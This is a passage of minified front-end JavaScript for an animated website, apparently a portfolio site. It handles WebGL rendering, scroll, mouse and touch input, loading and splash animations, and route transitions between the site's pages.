l.__Flag_ok__&&"home"!=__PAGE_TYPE__&&pageBodyScroll.onUpdate()),backGL.material.uniforms.tDiffuse.value)switch(backGL.material.uniforms.tDiffuse.value.name){case"HOME":routeTransition.__Flag__Back||backGL.__HOME__.onUpdateForDesktop(),backGL.renderer.setRenderTarget(backGL.__HOME__.fbo),backGL.renderer.clear(),backGL.renderer.render(backGL.__HOME__.scene,backGL.__HOME__.camera);break;case"SINGLE":backGL.__SINGLE__.onUpdate(),backGL.renderer.setRenderTarget(backGL.__SINGLE__.fbo),backGL.renderer.clear(),backGL.renderer.render(backGL.__SINGLE__.scene,backGL.__SINGLE__.camera);break;case"FOOTER":backGL.__FOOTER__.__Flag_ok__&&(backGL.__FOOTER__.onUpdate(),backGL.renderer.setRenderTarget(backGL.__FOOTER__.fbo),backGL.renderer.clear(),backGL.renderer.render(backGL.__FOOTER__.scene,backGL.__FOOTER__.camera))}backGL.onUpdate(),backGL.renderer.setRenderTarget(null),backGL.renderer.clear(),backGL.renderer.render(backGL.scene,backGL.camera),"reel"===__PAGE_TYPE__&&pageReel.onUpdate()},window.renderForMobile=function(){if(timestep<1e4?timestep++:timestep=0,requestAnimationFrame(renderForMobile),frontGL.__MASK__.__Flag_ing__&&(frontGL.__MASK__.onUpdate(),frontGL.renderer.render(frontGL.__MASK__.scene,frontGL.__MASK__.camera)),styleMenu.__Flag_open_before__||!routeTransition.render||"menu"===routeTransition.type)return!1;if(routeTransition.__Flag__Back||fakeScroll.onUpdateForMobile(),backGL.material&&backGL.material.uniforms.tDiffuse.value)switch(__PAGE_TYPE__){case"home":routeTransition.__Flag__Back||backGL.__HOME__.onUpdateForMobile(),backGL.renderer.setRenderTarget(backGL.__HOME__.fbo),backGL.renderer.clear(),backGL.renderer.render(backGL.__HOME__.scene,backGL.__HOME__.camera)}backGL.onUpdate(),backGL.renderer.setRenderTarget(null),backGL.renderer.clear(),backGL.renderer.render(backGL.scene,backGL.camera)}},function(t,e){var i;window.mouse={paused:!0,dir:-1,x:0,y:0,cx:0,cy:0,ax:0,ay:0,fx:0,fy:0,sx:0,sy:0,front:{x:.05,y:.05,deg:.04},back:{x:.025,y:.025,deg:.04},power:{rotation:0,position:1},ray:{x:0,y:0},speed:{delta:0,hitory:[],pow:0,tween:null},timer:null,wait:100,onMove:function(t){var e=this;this.paused=!1,$html.classList.remove("js--state-mouse-paused"),this.x=t.clientX,this.y=t.clientY,this.cx=(this.x-__WW__/2)/__WW__,this.cy=(this.y-__WH__/2)/__WH__,TweenLite.to(this,1.2,{ax:this.cx*loading.anim.power,ay:this.cy*loading.anim.power,sx:this.x/__WW__,sy:1-(this.y+fakeScroll.body.y)/__WH__}),TweenLite.to(this,.6,{fx:this.x/__WW__,fy:1-this.y/__WH__}),clearTimeout(this.timer),this.timer=setTimeout((function(){$html.classList.add("js--state-mouse-paused"),e.paused=!0}),2e3)},drag:{ing:!1,tween:null,el:null,deg:0,p:0,y:0,start_y:0,start_scroll_y:0},onDragStart:function(t){},onDragging:function(){},onDragEnd:function(){}},window.fakeWheel={timer:null,wait:30,ing:!1,x:0,y:0,speed:{delta:0,hitory:[],tween:[null,null],pow0:0,pow1:0,pow2:0,pow3:0},onStart:function(){},onWheel:function(t){if(this.wheelDistance(t),0===__WT__||Math.abs(this.x)>5)return!1;var e=this;this.y<0?mouse.dir=-1:mouse.dir=1,this.ing=!0,this.speed.delta+=Math.abs(this.y),this.speed.hitory.length>2?(this.speed.hitory.shift(),this.speed.hitory.push(this.speed.delta)):this.speed.hitory.push(this.speed.delta),this.speed.hitory.length>2&&(this.speed.pow0=Math.abs(.175*(Math.abs(this.speed.hitory[0])-Math.abs(this.speed.hitory[2]))),Math.abs(this.speed.pow0)>.4&&(this.speed.pow0=.4),this.speed.tween[0]=TweenLite.to(this.speed,3,{pow1:this.speed.pow0})),clearTimeout(this.timer),this.timer=setTimeout((function(){e.onComplete()}),this.wait),fakeScroll.anim.tween&&(fakeScroll.anim.tween.kill(),fakeScroll.anim.ing=!1)},onComplete:function(){this.onResetTweens(),this.speed.tween[0]=TweenLite.to(this.speed,1.3,{pow1:0}),this.ing=!1},onResetTweens:function(){for(var t=0;t<this.speed.tween.length;t++)this.speed.tween[t]&&this.speed.tween[t].kill()},wheelDistance:function(t){var e=t.deltaY?-t.deltaY:t.wheelDelta?t.wheelDelta:-t.detail,i=t.detail;this.y=i?e?e/i/40*i>0?1:-1:-i/3:e/120,this.x=t.deltaX}},window.addEventListener("wheel",(function(t){fakeWheel.onWheel(t)}),!1),window.addEventListener("mousemove",(function(t){mouse.onMove(t),frontGLSlider.__Flag_ok__&&frontGLSlider.ing&&frontGLSlider.onDragging(mouse),pageReel.__Flag_ok__&&pageReel.__Flag_seek__&&!isMobileFixed.any&&"reel"===__PAGE_TYPE__&&pageReel.onSeekTo()}),!1),window.addEventListener("mouseup",(function(t){frontGLSlider.__Flag_ok__&&frontGLSlider.ing&&frontGLSlider.onDragEnd(),pageReel.__Flag_ok__&&pageReel.__Flag_seek__&&!isMobileFixed.any&&"reel"===__PAGE_TYPE__&&pageReel.onSeekEnd()}),!1),window.touch={ing:!1,timer:null,onStart:function(t){var e=t.clientX,i=t.clientY;t.touches&&t.touches[0]&&(e=t.touches[0].clientX,i=t.touches[0].clientY),mouse.x=e,mouse.y=i,mouse.cx=(e-__WW__/2)/__WW__/2,mouse.cy=(i-__WH__/2)/__WH__/2,t.touches.length>1&&t.preventDefault(),backGL.__HOME__.__Flag_ok__&&"home"===__PAGE_TYPE__&&backGL.__HOME__.onTouchStart(),fakeScroll.anim.tween&&(fakeScroll.anim.tween.kill(),fakeScroll.anim.ing=!1,loading.__Flag_splash_complete__=!0),this.ing=!0},onComplete:function(t){backGL.__HOME__.__Flag_ok__&&"home"===__PAGE_TYPE__&&backGL.__HOME__.onTouchComplete(),this.ing=!1},dir:"down",history:[],onMove:function(t){var e=t.clientX,i=t.clientY;t.touches&&t.touches[0]?(e=t.touches[0].clientX,i=t.touches[0].clientY):t.originalEvent&&t.originalEvent.changedTouches[0]&&(e=t.originalEvent.changedTouches[0].clientX,i=t.originalEvent.changedTouches[0].clientY),mouse.x=e,mouse.y=i,mouse.cx=(e-__WW__/2)/__WW__/2,mouse.cy=(i-__WH__/2)/__WH__/2,TweenLite.to(mouse,1.2,{ax:mouse.cx,ay:mouse.cy})},onUpdate:function(){}},document.addEventListener("touchstart",(function(t){!t.target.classList.contains("no-events")&&isMobileFixed.any&&touch.onStart(t)}),{passive:!1}),document.addEventListener("touchend",(function(t){touch.onComplete(),clearTimeout(i),i=setTimeout((function(){touch.onComplete()}),100)}),{passive:!1}),window.__IS_WINDOW_SCROLL__=!1,window.addEventListener("scroll",(function(t){loading.tween&&loading.tween.kill(),__IS_WINDOW_SCROLL__=!0,isMobileFixed.any||(__WT__=window.scrollY||window.pageYOffset,fakeScroll.onScroll())}),!1),window.addEventListener("keydown",(function(t){71===t.keyCode&&$html.classList.add("is-k")}),!1),window.addEventListener("keyup",(function(t){$html.classList.remove("is-k")}),!1);var n,r,a=document.getElementById("root");window.addEventListener("load",(function(t){setInterval((function(){":root{--vh:1vh}"===a.innerText&&(a.innerText=":root {--vh:"+window.innerHeight/100+"px;}")}),100)})),window.directionCheck=function(){var t=Math.abs(window.orientation);__WO__=90==t?"yoko":"tate"},window.resizeControl={interval:null,timer:{dom:null,gl:null},history:[],onInit:function(){var t=this;clearInterval(this.interval),this.interval=setInterval((function(){t.history.length>=2?(t.history.shift(),t.history.push(__WW__)):t.history.push(__WW__),t.history.length>1&&0!=Math.abs(t.history[0]-t.history[1])&&t.onResize()}),1e3)},onResizeDOM:function(){__WW__=window.innerWidth,__WH__=window.innerHeight,styleRatio.onResize()},onResizeGL:function(){backGL.__Flag_ok__&&backGL.onResize(),backGL.__HOME__.__Flag_ok__&&backGL.__HOME__.onResize(),backGL.__SINGLE__.__Flag_ok__&&backGL.__SINGLE__.onResize(),pageBodyScroll.__Flag_ok__&&pageBodyScroll.onResize(),frontGL.__Flag_ok__&&frontGL.onResize(),frontGL.__HOME__.__Flag_ok__&&frontGL.__HOME__.onResize(),frontGL.__CONTENTS__.__Flag_ok__&&frontGL.__CONTENTS__.onResize(),frontGL.__LOGO__.__Flag_ok__&&(frontGL.__LOGO__.onResize(),frontGL.__LOGO__.onResizeAfter()),frontGLSlider.__Flag_ok__&&frontGLSlider.onResize(),frontGL.__MASK__.__Flag_ok__&&frontGL.__MASK__.onResize(),styleProgress.onResize()},onResize:function(){var t=this;if(isMobileFixed.any)return!1;clearTimeout(this.timer.dom),clearTimeout(this.timer.gl),this.timer.dom=setTimeout((function(){t.onResizeDOM()}),101),this.timer.gl=setTimeout((function(){t.onResizeGL()}),301)},orientationChange:function(){if(!isMobileFixed.any)return!1;clearTimeout(this.timer.dom),this.timer.dom=setTimeout((function(){location.reload()}),400)}},window.addEventListener("resize",(function(t){resizeControl.onResize()}),!1),window.addEventListener("orientationchange",(function(t){resizeControl.orientationChange()}),!1),void 0!==document.hidden?(n="hidden",r="visibilitychange"):void 0!==document.mozHidden?(n="mozHidden",r="mozvisibilitychange"):void 0!==document.msHidden?(n="msHidden",r="msvisibilitychange"):void 0!==document.webkitHidden&&(n="webkitHidden",r="webkitvisibilitychange"),window.handleVisibilityChange=function(){document[n]&&pageReel.__Flag_ok__&&pageReel.$video&&($html.classList.add("js--state-reel-paused"),pageReel.$video.pause())},void 0===document.addEventListener||void 0===n||document.addEventListener(r,handleVisibilityChange,!1),window.key={__Flag_down__:!1},document.addEventListener("keydown",(function(t){key.__Flag_down__=!0})),document.addEventListener("keyup",(function(t){key.__Flag_down__=!1}))},function(t,e){window.loading={__Flag_ing__:!0,__Flag_after__:!1,__Flag_complete__:!1,__Flag_splash_complete__:!1,__Flag_font_loaded__:!1,anim:{scale:1.4,power:0,twist:-1,rgb:__COL_B__/255,rotation:{x:0,y:0},progress:{f:{s:.5,e:Power2.easeOut},b:{s:.2,e:Power0.easeNone}},scroll:{x:0,y:0}},p:0,ready:function(){window.scroll(0,0),__WT__=0,fakeScroll.body.py=0,__ENV__.skip&&($html.classList.remove("is-loading-before"),$html.classList.add("is-loading-after"),$html.classList.add("is-splash-in"))},once:function(){var t=this;this.footer=new THREE.LoadingManager,this.footer.onLoad=function(){backGL.__FOOTER__.onLoaded()},this.onProgressStart(),this.contents=new THREE.LoadingManager,this.contents.onProgress=function(e,i,n){t.p=Math.floor(i/n*100),t.onProgress()},this.contents.onLoad=function(){}},body:{y:0,ease:.1},onetime:!1,onProgressStart:function(){this.__f=new TimelineMax({repeat:-1})},onProgress:function(){var t=this;t.p<99?TweenLite.to(".progress-f",this.anim.progress.b.s,{drawSVG:"0% "+t.p+"%",ease:this.anim.progress.b.e}):this.__Flag_ing__&&TweenLite.to(".progress-f",this.anim.progress.f.s,{drawSVG:"0% 100%",ease:this.anim.progress.f.e,onComplete:function(){$html.classList.add("is-progress-complete"),t.onProgressComplete(),t.__Flag_ing__=!1}})},onProgressComplete:function(){this.__f&&this.__f.kill(),this.__b&&this.__b.kill(),this.onLoadedBefore()},onLoadedBefore:function(){var t=Power1.easeInOut,e=this;TweenLite.set(".progress-f",{drawSVG:"0% 100%"}),TweenLite.to(".progress-f",1.1,{drawSVG:"100% 100%",ease:t}),TweenLite.to(".progress-svg",1.1,{rotation:360,ease:t,onComplete:function(){e.onSplashBefore(),e.onSplash()}}),onInitBefore()},onSplashBefore:function(){var t=this;TweenLite.set(".progress-svg",{rotation:0}),TweenLite.set(".progress-f",{drawSVG:"0% 0%"}),window.scroll(0,0),__WT__=0,fakeScroll.body.py=0,backGL.onLoaded(),backGL.__Flag_ok__=!0,backGL.__HOME__.__Flag_ok__=!0,backGL.__HOME__.onLoaded(),backGL.__SINGLE__.__Flag_ok__=!0,pageSingle.onInit(),frontGL.onLoaded(),isMobileFixed.any||frontGL.__LOGO__.onLoaded(),frontGL.__MASK__.onLoaded(),$html.classList.remove("is-loading-before"),$html.classList.add("is-loading-after","is-load-fonts"),isMobileFixed.any||WebFont.load({classes:!1,custom:{families:["Neue"],urls:["/assets/css/fonts.css"+__QUERY__]},active:function(){__LEGACY__||(frontGL.__HOME__.onLoaded(),frontGL.__CONTENTS__.title.fillText&&(frontGL.__CONTENTS__.title.fillText.canvas.draw(),frontGL.__CONTENTS__.title.fillText.tex.needsUpdate=!0)),t.__Flag_font_loaded__=!0}}),onInitAfter()},tween:null,onSplash:function(){var t=this,e=Power4.easeOut,i=Power4.easeInOut,n=Power3.easeInOut;"home"===__PAGE_TYPE__&&($html.classList.add("is-splash-before"),fakeScroll.onSplashIn(2.3,e,.6,1.5*__WH__)),backGL.__HOME__.onSplash(2.3,e,.6,1.5),isMobileFixed.any||(frontGL.__LOGO__.onSplashBefore(),frontGL.__LOGO__.onTransForm(2.3,i,frontGL.__LOGO__.now)),TweenLite.to(this.anim,2.3,{scale:1,ease:i,onComplete:function(){t.onLoadComplete(),t.__Flag_splash_complete__=!0}}),TweenLite.to(this.anim.rotation,2.3,{x:0,y:0,ease:i}),frontGL.__MASK__.center_to_top(2.48,n),setTimeout((function(){$html.classList.remove("is-loading-after"),$html.classList.add("is-loading-complete"),$html.style.backgroundColor=__COL_BLACK__,isMobileFixed.any||backGL.__FOOTER__.onLoadAssets(),isMobileFixed.any&&WebFont.load({classes:!1,custom:{families:["Neue"],urls:["/assets/css/fonts.css"+__QUERY__]}})}),600),"about"!==__PAGE_TYPE__&&"contact"!==__PAGE_TYPE__||TweenLite.to(".section-page-lead",1.8,{opacity:1,ease:e}),TweenLite.to(".js--slide-leave",1.8,{y:"110%",scale:.85,ease:n}),"home"===__PAGE_TYPE__&&styleProgress.onProgressTo(100/backGL.__HOME__.total,1.8,n),TweenLite.to(this.anim,2.3,{power:1}),isMobileFixed.any&&styleMobile.onEnter(),this.__Flag_after__=!0,isMobileFixed.any?renderForMobile():renderForDesktop()},onLoadComplete:function(){this.__Flag_complete__=!0,pageBodyScroll.__Flag_ok__&&pageBodyScroll.onResize()}},loading.ready()},function(t,e){window.styleProgress={tween:{f:null,b:null,c:null},count:{s:1100,timer:null},__Flag_count__:!1,__Flag_count_complete__:!1,once:function(){this.$progress_svg=document.querySelectorAll(".progress-svg")[0],this.$progress_f=document.querySelectorAll(".progress-f")[0],this.$progress_b=document.querySelectorAll(".progress-b")[0],this.$progress_c=document.querySelectorAll(".site-control-counter-move")[0]},onResize:function(){var t=Power2.easeInOut;if("home"===__PAGE_TYPE__){var e=100/backGL.__HOME__.total;TweenLite.to(this.$progress_f,1,{drawSVG:"0% "+e+"%",ease:t})}else TweenLite.to(this.$progress_f,1,{drawSVG:"100% 100%",ease:t})},progress:0,onHide:function(){var t=Power2.easeInOut;TweenLite.to(this.$progress_f,.5,{drawSVG:"100% 100%",ease:t}),TweenLite.to(this.$progress_b,.5,{drawSVG:"100% 100%",ease:t})},onReset:function(){this.__Flag_count__=!1,clearInterval(this.count.timer),$html.classList.remove("js--control-type-counter"),this.tween.f&&this.tween.f.kill(),this.tween.c&&this.tween.c.kill(),TweenLite.set(this.$progress_c,{y:"0%"})},onResetByMenu:function(){clearInterval(this.count.timer),$html.classList.remove("js--control-type-counter"),this.tween.f&&this.tween.f.kill(),this.tween.c&&this.tween.c.kill(),TweenLite.set(this.$progress_c,{y:"0%"}),this.__Flag_count__&&(this.__Flag_count__=!1,TweenLite.to(this.$progress_f,.6,{drawSVG:"0% 100%",ease:Power2.easeInOut}))},onRotate:function(t){this.onReset(),this.tween.f=TweenLite.set(this.$progress_svg,{rotation:360*t})},onRotateTo:function(t,e,i){this.tween.f=TweenLite.to(this.$progress_svg,e,{rotation:t,ease:i})},onProgress:function(t){if(this.__Flag_leaving__)return!1;this.onReset(),this.tween.f=TweenLite.to(this.$progress_f,.1,{drawSVG:"0 "+100*t+"%"})},setProgress:function(t){if(this.__Flag_leaving__)return!1;this.onReset(),TweenLite.set(this.$progress_f,{drawSVG:"-0.1 "+t+"%"})},onProgressTo:function(t,e,i){TweenLite.to(this.$progress_f,e,{drawSVG:"-0.1 "+t+"%",ease:i})},onResetProgress:function(t){this.onReset(),this.tween.f=TweenLite.to(this.$progress_f,1,{drawSVG:"0% "+100*t+"%"})},onCountStart:function(){var t=this;if(this.tween.f&&!styleMenu.__Flag_clicked__){this.onReset(),this.__Flag_count_complete__=!1,this.__Flag_count__=!0,$html.classList.add("js--control-type-counter"),this.tween.f=null,this.tween.f=new TimelineLite,this.tween.f.to(this.$progress_f,.1,{drawSVG:"0% 100%"}),this.tween.f.to(this.$progress_f,this.count.s/1e3*5,{drawSVG:"100% 100%",ease:Power0.easeNone,onComplete:function(){t.onCountComplete()}});var e=0;this.onCounting(e),this.count.timer=setInterval((function(){e++,t.onCounting(e)}),this.count.s)}},onCounting:function(t){var e=Power2.easeInOut;this.tween.c=TweenLite.to(this.$progress_c,this.count.s/1e3,{y:20*-t+"%",ease:e})},onCountComplete:function(){if(!__ENV__.autojump)return!1;clearTimeout(this.count.timer),this.__Flag_count_complete__=!0,this.onGotoNextPage();var t=new TimelineLite;t.to(this.$progress_b,this.count.s/2e3,{drawSVG:"100% 100%",ease:Power2.easeIn}),t.set(this.$progress_b,{drawSVG:"0% 0%"}),t.to(this.$progress_b,this.count.s/1e3,{drawSVG:"0% 100%",ease:Power2.easeOut})},onGotoNextPage:function(){$html.classList.remove("js--control-type-counter"),document.getElementsByClassName("js--goto-next-page-timer").length&&document.getElementsByClassName("js--goto-next-page-timer")[0].click()},__Flag_leaving__:!1,onLeave:function(){var t,e=this;e.__Flag_leaving__=!0,$html.classList.remove("js--control-type-counter"),clearInterval(this.count.timer),this.tween.f&&this.tween.f.kill(),this.tween.c&&this.tween.c.kill(),(t=new TimelineLite).to(this.$progress_f,1*routeTransition.anim.tr.out.s,{drawSVG:"100% 100%",ease:Power2.easeOut,onComplete:function(){__WT__=0,fakeScroll.body.y=0,fakeScroll.body.py=0,window.scroll(0,0),e.__Flag_leaving__=!1}}),t.set(this.$progress_f,{drawSVG:"-0.1% 0%"}),(t=new TimelineLite).to(this.$progress_b,.4*routeTransition.anim.tr.out.s,{drawSVG:"100% 100%",ease:Power2.easeIn}),t.set(this.$progress_b,{drawSVG:"0% 0%"}),t.to(this.$progress_b,.6*routeTransition.anim.tr.in.s,{drawSVG:"0% 100%",ease:Power2.easeOut})}},window.getNextElement=function(t,e){return e&&document.querySelector(e)!==t.nextElementSibling?null:t.nextElementSibling},window.getPrevElement=function(t,e){return e&&document.querySelector(e)!==t.previousElementSibling?null:t.previousElementSibling}},function(t,e){window.styleMenu={power:0,anim:{pow:0,tween:null},__Flag_open_before__:!1,__Flag_open__:!1,__Flag_clicked__:!1,once:function(){},onOpen:function(){if($html.classList.contains("is-page-tr-start"))return!1;var t=Power2.easeInOut,e=this;this.anim.tween&&this.anim.tween.kill(),this.anim.tween=TweenLite.to(this.anim,1.2,{pow:1,ease:t}),this.__Flag_clicked__||($html.classList.remove("js--menu-open-leave"),$html.classList.add("js--menu-open-enter"),styleProgress.__Flag_count__&&styleProgress.onResetByMenu(),isMobileFixed.any?styleMobile.onOpen():frontGL.__MASK__.fade_in_mouse(.7,t)),this.__Flag_open_before__=!0,this.__Flag_clicked__=!0,document.querySelectorAll(".site-nav-a").forEach((function(t,e){var i=t.querySelectorAll(".t");t.classList.contains("nuxt-link-exact-active")?TweenLite.set(i,{y:"-50%"}):TweenLite.set(i,{clearProps:"all"})})),clearTimeout(this.timer_after),clearTimeout(this.timer_before),this.timer_before=setTimeout((function(){e.__Flag_open__=!0,e.__Flag_clicked__=!1}),700)},timer_before:null,timer_after:null,onClose:function(){Power2.easeInOut;var t=this;this.anim.tween&&this.anim.tween.kill(),this.anim.tween=TweenLite.to(this.anim,1,{pow:0,ease:Power2.easeOut}),this.__Flag_clicked__||($html.classList.remove("js--menu-open-enter"),$html.classList.add("js--menu-open-leave"),isMobileFixed.any?styleMobile.onClose():frontGL.__MASK__.center_to_top(.8,Power2.easeInOut)),this.__Flag_clicked__=!0,clearTimeout(this.timer_after),clearTimeout(this.timer_before),this.timer_before=setTimeout((function(){t.__Flag_open_before__=!1}),300),this.timer_after=setTimeout((function(){$html.classList.remove("js--menu-open-leave"),t.__Flag_open__=!1,t.__Flag_clicked__=!1}),600)},onMouseEnter:function(t){if("menu"!=routeTransition.type){t.target.classList.add("_hover");var e=t.target.querySelectorAll(".t");TweenLite.set(e,{y:"-50%"})}},onMouseLeave:function(t){if("menu"!=routeTransition.type){t.target.classList.remove("_hover");var e=t.target.querySelectorAll(".t");TweenLite.set(e,{y:"0%"})}}}},function(t,e){window.styleMobile={$body:null,y:0,move:{enable:!1,$title:null,$body:null,h:0,y:0,total_height:0},onInit:function(){if(this.y=0,this.move.y=0,this.move.h=0,this.$body=document.querySelectorAll(".site-body")[0],this.$body.style.height=__WH__+"px",this.move.$body=document.querySelectorAll(".page-title-move"),this.move.$title=document.querySelectorAll(".page-title"),this.move.$title_ghost=document.querySelectorAll(".page-title-ghost"),this.move.$body.length){var t=this.move.$body[0].getBoundingClientRect();this.move.h=t.height,this.move.enable=!0;var e=this.move.$title.length-1;this.move.total_height=e*this.move.h}else this.move.enable=!1},onScroll:function(t){if(!isMobileFixed.any)return!1;if(__WT__=t.target.scrollTop,fakeScroll.onScroll(),"home"===__PAGE_TYPE__)for(var e=Math.round(fakeScroll.body.py*(this.move.$title.length-1)),i=0;i<this.move.$title.length;i++)e===i?this.move.$title[i].classList.add("_active"):this.move.$title[i].classList.remove("_active")},onScrollTo:function(t,e,i){TweenLite.to(".site-body",t,{scrollTo:i,ease:e,autoKill:!1})},onResize:function(){if(this.$body.style.height=__WH__+"px",this.move.$body.length){var t=this.move.$body[0].getBoundingClientRect();this.move.h=t.height,this.move.enable=!0;var e=this.move.$title.length-1;this.move.total_height=e*this.move.h}},onLeave:function(t){},onEnter:function(){},onOpen:function(t,e){},onClose:function(t,e){},onUpdate:function(){if(!this.move.enable)return!1;"home"===__PAGE_TYPE__&&(this.move.y=fakeScroll.body.py*this.move.total_height,TweenLite.to(this.move.$body,.2,{y:-this.move.y}))}}},function(t,e,i){"use strict";i.r(e),i(4),window.addEventListener("popstate",(function(t){routeTransition.__Flag__Back=!0,routeTransition.onChangeType()})),window.routeTransition={__Flag__Back:!1,__Flag__Menu:!1,type:"normal",render:!0,anim:{tr:{in:{s:2*__ANIM__,e:Power3.easeOut},out:{s:__ANIM__,e:Power3.easeInOut}},zoom:{in:{s:2.335*__ANIM__,e:Power4.easeInOut},out:{s:2.335*__ANIM__,e:Power4.easeOut}},mask:{timer:null,in:{s:__ANIM__,e:Power2.easeIn},out:{s:2.335*__ANIM__,e:Power2.easeOut}},mouse:{in:{s:__ANIM__,e:Power2.easeInOut},out:{s:__ANIM__,e:Power2.easeInOut}},donuts:{in:{s:__ANIM__,e:Power2.easeIn},out:{s:2.335*__ANIM__,e:Power2.easeOut}},scroll:{in:{s:2.335*__ANIM__,e:Power3.easeOut}},progress:{in:{s:2*__ANIM__,e:Power1.easeOut}},logo:{in:{s:2.335*__ANIM__,e:Power3.easeInOut},out:{s:2.335*__ANIM__,e:Power3.easeOut}}},name:null,slug:null,__Flag__start:!1,onInit:function(t){this.name=t.name,this.slug=t.slug,$html.classList.add("is-page-tr-start")},old:null,new:null,onChangeType:function(t){"home"===t||"index___ja"===t||"index___en"===t?__PAGE_TYPE__="home":"works"===t||"works___ja"===t||"works-category-slug___ja"===t||"works___en"===t||"works-category-slug___en"===t?__PAGE_TYPE__="works":"reel"===t||"reel___ja"===t||"reel___en"===t?__PAGE_TYPE__="reel":"about"===t||"about___ja"===t||"about___en"===t?__PAGE_TYPE__="about":"contact"===t||"contact___ja"===t||"contact___en"===t?__PAGE_TYPE__="contact":"single"===t||"works-slug___ja"===t||"works-slug___en"===t?__PAGE_TYPE__="single":"404"!==t&&"404___ja"!==t&&"404___en"!==t||(__PAGE_TYPE__="404")},onMountedBefore:function(){this.onDestroy(),removeClass($body,["is-page-in-"]),removeClass($html,["is-tr-type-","js--state-"]),$body.classList.add("is-page-in-"+__PAGE_TYPE__),styleRatio.onResize()},onMounted:function(t,e){var i=this;if(this.old=__PAGE_TYPE__,this.onChangeType(t),this.new=__PAGE_TYPE__,loading.__Flag_after__){this.onMountedBefore();var n=frontGL.__LOGO__.transform[this.new];switch(n||(n=frontGL.__LOGO__.transform.normal),this.new){case"single":if(onInitBefore(),onInitAfter(),isMobileFixed.any&&styleMobile.onInit(),fakeScroll.setHeight(__WH__,1),frontGL.__CONTENTS__.onLoadContents(),isMobileFixed.any)backGL.material.uniforms.tDiffuse.value=backGL.__SINGLE__.fbo.texture;else if(__IS_PICKUP__){if(__IS_PICKUP__)switch(this.old){case"home":backGL.__HOME__.zoom.enable||(backGL.__HOME__.zoom.enable=!0,backGL.__HOME__.onZoomIn(backGL.__HOME__.center.index,this.anim.zoom.in.s,this.anim.zoom.in.e,e),backGL.onZoomIn(this.anim.zoom.in.s),frontGL.__HOME__.onZoomIn(this.anim.zoom.in.s,this.anim.zoom.in.e));break;case"single":case"works":backGL.material.uniforms.tDiffuse.value=backGL.__SINGLE__.fbo.texture,backGL.__SINGLE__.onLoadSingleFv()}}else backGL.material.uniforms.tDiffuse.value=backGL.__SINGLE__.fbo.texture,backGL.__SINGLE__.onLoadSingleFv();"home"!=this.old&&"single"!=this.old?(frontGL.__LOGO__.setTransForm(frontGL.__LOGO__.transform.zoom_before_normal),frontGL.__LOGO__.onTransForm(this.anim.logo.out.s,this.anim.logo.out.e,n)):frontGL.__LOGO__.setTransForm(n),1!=backGL.scale&&(backGL.scale=1,backGL.material.uniforms.pixel_rario.value=1/backGL.scale,backGL.onResize());break;case"home":if(backGL.material.uniforms.tDiffuse.value=backGL.__HOME__.fbo.texture,1!=backGL.scale&&(backGL.scale=1,backGL.material.uniforms.pixel_rario.value=1/backGL.scale,backGL.onResize()),backGL.__HOME__.onZoomOut(this.anim.zoom.out.s,this.anim.zoom.out.e),frontGL.__HOME__.onZoomOut(this.anim.zoom.out.s,this.anim.zoom.out.e),backGL.__HOME__.onScrollReset(),onInitBefore(),onInitAfter(),isMobileFixed.any&&styleMobile.onInit(),backGL.__HOME__.onResize(),"single"!=this.old?(frontGL.__LOGO__.setTransForm(frontGL.__LOGO__.transform.zoom_before_normal),frontGL.__LOGO__.onTransForm(this.anim.logo.out.s,this.anim.logo.out.e,n)):frontGL.__LOGO__.setTransForm(n),!isMobileFixed.any){var r=Power4.easeOut;backGL.__HOME__.onSplash(2.3,r,.1,1),fakeScroll.onScrollFrom(2.3,r,.1,1.5*__WH__)}break;case"works":backGL.material.uniforms.tDiffuse.value=backGL.__SINGLE__.fbo.texture,onInitBefore(),onInitAfter(),isMobileFixed.any&&styleMobile.onInit(),fakeScroll.setHeight(__WH__,1),frontGL.__CONTENTS__.onLoadContents(),frontGL.__LOGO__.setTransForm(frontGL.__LOGO__.transform.zoom_before_normal),frontGL.__LOGO__.onTransForm(this.anim.logo.out.s,this.anim.logo.out.e,n),this.type="normal";break;case"contact":case"about":backGL.scale!=window.devicePixelRatio&&(backGL.scale=window.devicePixelRatio,backGL.material.uniforms.pixel_rario.value=1/backGL.scale,backGL.onResize()),isMobileFixed.any||backGL.__FOOTER__.__Flag_ok__||backGL.__FOOTER__.onLoadAssets(),isMobileFixed.any?backGL.material.uniforms.tDiffuse.value=backGL.__SINGLE__.fbo.texture:backGL.material.uniforms.tDiffuse.value=backGL.__FOOTER__.fbo.texture,onInitBefore(),onInitAfter(),isMobileFixed.any&&styleMobile.onInit(),fakeScroll.setHeight(__WH__,1),frontGL.__CONTENTS__.onLoadContents();var a=Power3.easeOut;frontGL.__LOGO__.setTransForm(frontGL.__LOGO__.transform.zoom_before_pages),frontGL.__LOGO__.onTransForm(2.2,a,n),this.type="normal";break;case"reel":1!=backGL.scale&&(backGL.scale=1,backGL.material.uniforms.pixel_rario.value=1/backGL.scale,backGL.onResize()),backGL.material.uniforms.tDiffuse.value=backGL.__SINGLE__.fbo.texture,onInitBefore(),onInitAfter(),isMobileFixed.any&&styleMobile.onInit(),fakeScroll.setHeight(__WH__,1),frontGL.__CONTENTS__.onLoadContents(),frontGL.__LOGO__.setTransForm(frontGL.__LOGO__.transform.zoom_before_normal),frontGL.__LOGO__.onTransForm(this.anim.logo.out.s,this.anim.logo.out.e,n);break;case"404":1!=backGL.scale&&(backGL.scale=1,backGL.material.uniforms.pixel_rario.value=1/backGL.scale,backGL.onResize()),backGL.material.uniforms.tDiffuse.value=backGL.__SINGLE__.fbo.texture,onInitBefore(),onInitAfter(),isMobileFixed.any&&styleMobile.onInit(),fakeScroll.setHeight(__WH__,1),frontGL.__CONTENTS__.onLoadContents(),frontGL.__LOGO__.setTransForm(frontGL.__LOGO__.transform[404]),frontGL.__LOGO__.onTransForm(this.anim.logo.out.s,this.anim.logo.out.e,n)}}clearTimeout(this.timer.type),this.timer.type=setTimeout((function(){i.type="normal",removeClass($html,["is-tr-to-"])}),1e3*this.anim.mask.out.s),this.__Flag__start=!1,key.__Flag_down__=!1},onDestroy:function(){frontGL.__CONTENTS__.onDestroy(),backGL.__SINGLE__.onDestroy(),styleInview.onDestroy()},onBeforeEnter:function(t){this.onResetScroll()},onAfterEnter:function(t){Power3.easeOut,this.tween.enter&&this.tween.enter.kill(),TweenLite.set(".js--slide-up",{y:"120%"}),this.tween.enter=TweenLite.to(".js--slide-up",this.anim.tr.in.s,{y:"0%",ease:this.anim.tr.in.e}),TweenLite.to(".section-page-lead",this.anim.tr.in.s+.416666667*this.anim.tr.in.s,{opacity:1,ease:this.anim.tr.in.e})},onResetScroll:function(){__WT__=0,fakeScroll.body.y=0,fakeScroll.body.py=0,window.scroll(0,0)},onEnter:function(t,e){if(this.__